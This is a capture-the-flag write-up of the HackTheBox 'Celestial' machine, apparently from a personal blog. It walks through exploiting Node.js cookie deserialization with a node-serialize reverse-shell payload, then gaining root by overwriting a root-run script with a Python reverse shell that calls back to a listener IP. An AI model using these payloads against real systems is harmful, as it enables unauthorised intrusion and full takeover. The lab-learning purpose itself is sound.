# Recon

As usual we start with a port scan on the target:
```
sudo nmap -sV -p- -sC -oN nmap.txt -O 10.10.10.85 -T5
```

That only reveals an open port on 3000 running the Node.js Express Framework. 

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Celestial/assets/1.png">

# Enumeration

After browsing to the website we run into a 404. But after refreshing we get a different message, some sort of formula. BurpSuite shows that on the first visit a cookie is set and after revisiting this is passed as a parameter.

Removing the following from the get request resulted in an error. This tells us that the data appears to be unserialized. We also spot a username: ```sun```.
```
Upgrade-Insecure-Requests: 1
If-None-Match: W/"c-8lfvj2TmiRRvB7K+JPws1w9h6aY"
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Celestial/assets/2.png">

The cookie appears to be base64 encoded. After decoding we get the following result:
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Celestial/assets/3.png">

Changing the ```num``` has an effect on the formula. We can mess with the parameters to generate the same kind of error we got before.

# Initial Foothold
We can use nodejsshell.py to create a encoded NodeJS reverse shell. We'll first have to create a payload, serialize it, base64 encode it and finally send it as the cookie parameter. 

[nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py)

First we'll run ```python nodejsshell.py [Listener IP] [Listener Port]``` to create the encoded shell:

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Celestial/assets/4.png">


Then we'll create an ```exploit.js``` file which we use to serialize the payload so that it matches the website's.
```
var y = { rce: function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,10>
}
var serialize = require('node-serialize');
var s = serialize.serialize(y)
console.log("Serialized: \n" + s.slice(0,-2) + "()" + s.slice(-2,));

```

Running ```nodejs exploit.js``` will create our serialized payload.

I had a issue saying the node-serialize module could not be found. Running ```npm install``` solved this.

After these steps we finally base64 encode it so we can pass it as the cookie parameter. We make sure to have our listener ready before we send our request with BurpSuite. This will result in an error but at the same time provides us with a reverse shell as user ```sun```.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Celestial/assets/5.png">


# Privilege Escalation
First we'll upgrade the shell. We'll run ```which python``` to see if it has python installed.
We then run the following commands:
```
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

Press ctrl+z key combination 

stty raw -echo; fg
```

One thing we notice is that user ```sun``` is part of the admin group. We also spot a file called ```script.py``` in the home directory. One directory up we find ```output.txt``` which get's changed every 5 minutes. The content is the content from ```script.py```.

If this script is initiated by the root user we can try to alter the content of the file in order to give us a root shell.

We can use ```pspy``` to see what's exactly going on. Download it from [here](https://github.com/DominicBreuker/pspy). 

After a few minutes we see the following commands proving what we already thought:

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Celestial/assets/6.png">

Good news! Now we can use a oneliner php shell and save it as the script:
```
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",4446));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);" > script.py
```

With our new listener ready on port 4446 we wait a few minutes for the script to run. As soon as it gets executed a root shell will pop up.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Celestial/assets/7.png">